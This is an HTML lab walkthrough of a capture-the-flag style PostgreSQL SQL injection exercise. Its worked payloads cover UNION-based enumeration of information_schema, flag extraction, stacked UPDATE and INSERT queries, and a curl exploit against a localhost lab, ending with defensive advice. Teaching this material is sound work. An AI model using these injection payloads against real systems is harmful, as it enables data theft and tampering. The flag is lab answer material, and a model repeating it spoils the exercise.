<h4>Step 1: Test Normal Search and Confirm Injection</h4>
<p>
    Search for a known note to see normal results, then inject a single quote to confirm injection.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search + Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Meeting<br>
        <span class="prompt">SQL&gt; </span>SELECT id, title, content FROM notes WHERE title ILIKE '%Meeting%'<br>
        <span class="prompt">Output: </span><strong>ID:</strong> 1 &bull; <strong>Title:</strong> Meeting Notes &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}<br><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>ERROR: unterminated quoted string at or near "'"</strong>
    </div>
</div>

<h4>Step 2: Discover the Hidden Table via UNION</h4>
<p>
    Enumerate tables from <code>information_schema</code> to find the hidden flag table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Enumerate Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 2 &bull; <strong>Title:</strong> Shopping List &bull; <strong>Content:</strong> Milk, eggs, bread, coffee beans.<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> flag_store &bull; <strong>Content:</strong> flag_text<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> flag_store &bull; <strong>Content:</strong> id<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> notes &bull; <strong>Content:</strong> content<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> notes &bull; <strong>Content:</strong> title<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> notes &bull; <strong>Content:</strong> id
    </div>
</div>

<p>Found: <code>flag_store(id, flag_text)</code>: the hidden table with the flag.</p>

<h4>Step 3: Direct UNION Extraction</h4>
<p>
    The simplest approach: read the flag directly with UNION SELECT.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. UNION Extract</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT id, flag_text, flag_text FROM flag_store --<br><br>
        <span class="prompt">Output (flag_store row visible among results):</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> FLAG{pg_st4ck3d_mult1_qu3ry} &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}<br>
        <strong>ID:</strong> 2 &bull; <strong>Title:</strong> Shopping List &bull; <strong>Content:</strong> Milk, eggs, bread, coffee beans.<br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> Meeting Notes &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}
    </div>
</div>

<h4>Step 4: Stacked Queries. UPDATE (The Core Technique)</h4>
<p>
    Unlike MySQL, PostgreSQL's <code>pg_query()</code> natively supports executing multiple
    statements separated by <code>;</code>. This means you can inject <code>INSERT</code>,
    <code>UPDATE</code>, <code>DELETE</code>, and more. Use <code>UPDATE</code> to copy the flag
    into a note's content.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Stacked UPDATE</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; UPDATE notes SET content=(SELECT flag_text FROM flag_store LIMIT 1) WHERE id=1; --<br>
        <span class="prompt">Response: </span>No notes found. (UPDATE executed silently)<br><br>
        <span class="prompt">// Now search for the updated note:</span><br>
        <span class="prompt">// Now search for the updated note:</span><br>
        <span class="prompt">Input: </span>Meeting<br>
        <span class="prompt">Output: </span><strong>ID:</strong> 1 &bull; <strong>Title:</strong> Meeting Notes &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}
    </div>
</div>

<p>The stacked <code>UPDATE</code> copied the flag into the Meeting Notes content!</p>

<h4>Step 5: Stacked INSERT. Create a New Note with the Flag</h4>
<p>
    Alternatively, insert a new note containing the flag.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Stacked INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; INSERT INTO notes (title, content) SELECT 'pwned', flag_text FROM flag_store; --<br>
        <span class="prompt">Response: </span>No notes found. (INSERT executed silently)<br><br>
        <span class="prompt">// Now search for the inserted note:</span><br>
        <span class="prompt">Input: </span>pwned<br>
        <span class="prompt">Output: </span><strong>ID:</strong> 6 &bull; <strong>Title:</strong> pwned &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_st4ck3d_mult1_qu3ry}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab6" \<br> --data-urlencode "search=' UNION SELECT id, flag_text, flag_text FROM flag_store --"<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Title:</strong> FLAG{pg_st4ck3d_mult1_qu3ry} &bull; <strong>Content:</strong> FLAG{pg_st4ck3d_mult1_qu3ry}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL fully supports stacked queries: multiple SQL statements
    separated by <code>;</code> can be executed in a single <code>pg_query()</code> call. This makes
    PostgreSQL injection significantly more dangerous than MySQL (where <code>mysqli_query()</code> blocks
    multi-statements by default). An attacker can execute <code>INSERT</code>, <code>UPDATE</code>,
    <code>DELETE</code>, <code>DROP</code>, <code>CREATE</code>, and more. Defense: use
    <code>pg_query_params()</code> which prevents injection entirely, and apply least-privilege database
    users that cannot modify data.
</div>
